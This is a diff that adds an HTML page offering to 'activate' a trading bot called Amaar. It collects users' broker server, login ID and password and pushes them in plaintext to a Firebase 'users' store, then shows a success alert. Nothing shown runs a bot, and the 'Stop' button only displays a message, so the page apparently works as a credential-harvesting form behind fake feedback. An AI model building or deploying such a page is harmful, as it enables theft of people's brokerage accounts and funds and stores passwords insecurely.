@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" type="image/png" href="https://www.pngall.com/wp-content/uploads/13/Bulls-Logo-PNG-File.png">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+    <div class="dashboard-container">
+        <h1>Activate Amaar Bot</h1>
+        <form id="brokerForm">
+            <label for="broker">Select Broker:</label>
+            <select id="broker">
+                <option value="Exness">Exness</option>
+                <option value="Accumarkets">Accumarkets</option>
+            </select>
+
+            <label for="brokerServer">Broker Server:</label>
+            <input type="text" id="brokerServer" required>
+
+            <label for="loginID">Login ID:</label>
+            <input type="text" id="loginID" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" required>
+
+            <button type="submit" class="btn">Activate Amaar</button>
+        </form>
+
+        <button id="stopBtn" class="btn btn-danger">Stop Amaar</button>
+        <a href="storeData.html" class="btn btn-secondary">Go to Admin</a>
+    </div>
+
+    <script>
+        // Initialize Firebase (replace with your own config)
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            databaseURL: "YOUR_DATABASE_URL",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_STORAGE_BUCKET",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        document.getElementById("brokerForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const broker = document.getElementById("broker").value;
+            const brokerServer = document.getElementById("brokerServer").value;
+            const loginID = document.getElementById("loginID").value;
+            const password = document.getElementById("password").value;
+
+            // Save the data to Firebase
+            const userData = { broker, brokerServer, loginID, password, timestamp: Date.now() };
+            firebase.database().ref('users').push(userData)
+                .then(() => {
+                    alert("Amaar bot activated successfully!");
+                })
+                .catch((error) => {
+                    console.error("Error writing to Firebase Database", error);
+                    alert("An error occurred. Please try again.");
+                });
+        });
+
+        document.getElementById("stopBtn").addEventListener("click", function() {
+            alert("Amaar bot stopped successfully!");
+        });
+    </script>
+</body>
+</html>
